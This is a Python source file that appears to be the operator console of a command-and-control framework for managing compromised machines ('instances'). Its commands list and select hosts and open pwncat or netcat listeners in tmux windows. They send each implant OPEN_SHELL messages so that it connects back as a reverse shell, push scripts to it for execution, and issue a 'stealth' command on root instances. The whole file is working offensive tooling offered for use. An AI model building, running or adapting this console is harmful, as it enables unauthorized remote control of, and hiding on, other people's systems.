import errno
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.validation import DynamicValidator, Validator
import os
import subprocess
import socket
from threading import Lock
from time import sleep
from typing import Callable, List, Optional, Tuple

from core.message import Message, MESSAGE_PURPOSE

from instance import Instance
import instance_manager
import my_logging
import web_server


logger = my_logging.Logger('APP')


def get_lambda(func: Callable, *args):
    return lambda: func(*args)


class App:
    selected_instance: Optional[Instance] = None
    _instances: Tuple[Instance] = ()

    def __init__(self):
        instance_manager.on_instances_update = self._on_instances_update
        global logger
        session = PromptSession()
        with patch_stdout(raw=True):
            while True:
                command = session.prompt(
                    lambda: f'[{self.selected_instance.username if self.selected_instance in self._instances else None}]> ',
                    completer=DynamicCompleter(lambda: NestedCompleter.from_nested_dict(self.completions)),
                    pre_run=session.default_buffer.start_completion,
                    validator=DynamicValidator(lambda: Validator.from_callable(lambda x: self.get_callable_from_command(x) is not None))
                )

                result = self.get_callable_from_command(command)()
                if isinstance(result, (list, tuple)):
                    logger.output('\n'.join(str(line) for line in result))
                elif result is not None:
                    logger.output(str(result))

    def get_callable_from_command(self, command: str) -> Optional[Callable]:
        try:
            args = []
            command_parts = command.split(' ')
            item = self.completions_with_functions
            for i in range(len(command_parts)):
                command_part = command_parts[i]
                try:
                    int(command_part)
                    item = item['INT']
                    args.append(int(command_part))
                except ValueError or KeyError:
                    item = item[command_part]
                if callable(item):
                    return get_lambda(item, *args)
        except KeyError:
            pass

    @property
    def completions_with_functions(self):
        instance_commands_if_root = {
            'stealth': self._do_stealth
        }
        instance_commands = {
            'pwncat': self._do_pwncat,
            'run_script': {
                script: get_lambda(self._do_run_script, script) for script in map(lambda path: os.path.split(path)[-1], web_server.get_available_scripts())
            },
            'shell': self._do_open_shell_bash
        }
        commands = {
            'show': {
                'instances': self._list_instances
            },
            'set': {
                'instance': {
                    str(instance): get_lambda(self._do_set_selected_instance, instance.instance_id) for instance in self._instances
                }
            },

        }

        if self.selected_instance is not None:
            if self.selected_instance.is_root:
                commands = {**commands, **instance_commands_if_root}
            commands = {**commands, **instance_commands}
        return commands

    @property
    def completions(self):
        completions = {}

        def strip_functions(key_path):
            item = self.completions_with_functions
            for key in key_path:
                item = item[key]
            for key in item.keys():
                if callable(item[key]):
                    new_item = completions
                    for new_key in key_path:
                        if new_item.get(new_key, None) is None:
                            new_item[new_key] = {}
                        new_item = new_item[new_key]
                    new_item[key] = None
                else:
                    strip_functions([*key_path, key])

        strip_functions([])
        return completions

    def _do_set_selected_instance(self, instance_id: str):
        self.selected_instance = instance_manager.get_by_id(instance_id)

    def _do_run_script(self, script):
        self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.RUN_SCRIPT, script))

    def _do_pwncat(self):
        port = get_open_port()
        open_new_window_with_cmd(f'pwncat -lp {port}', f'pc:{self.selected_instance.username}@{port}')
        sleep(1)
        self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))

    def _do_open_shell_bash(self):
        port = get_open_port()
        open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
        self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))

    def _do_stealth(self):
        self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.STEALTH))

    def _on_instances_update(self, instances: Tuple[Instance], new_instance: Optional[Instance] = None):
        self._instances = instances

        if self.selected_instance not in instances:
            self.selected_instance = None
        if self.selected_instance is None and len(instances) > 0:
            self.selected_instance = instances[0]

        if new_instance is not None:
            self.selected_instance = new_instance
            logger.info(f'New instance connected: {new_instance}')
            # self._do_open_shell_bash()

        else:
            if self.selected_instance not in instances:
                self.selected_instance = None
            if self.selected_instance is None and len(instances) > 0:
                self.selected_instance = instances[0]

    def _list_instances(self):
        for instance in self._instances:
            logger.output(f'{"==> " if instance == self.selected_instance else "    "}{instance}')


def open_new_window_with_cmd(cmd: str, window_name=None):
    subprocess.Popen(f'tmux new-window {f"-n {window_name}" if window_name is not None else ""} {cmd}', shell=True)


_last_used_port = 50000
_port_lock = Lock()


def get_open_port():
    global _last_used_port
    with _port_lock:
        while True:
            _last_used_port += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind(('localhost', _last_used_port))
                s.close()
                return _last_used_port
            except socket.error as e:
                if e.errno == errno.EADDRINUSE:
                    pass
                else:
                    pass


def main():
    App()
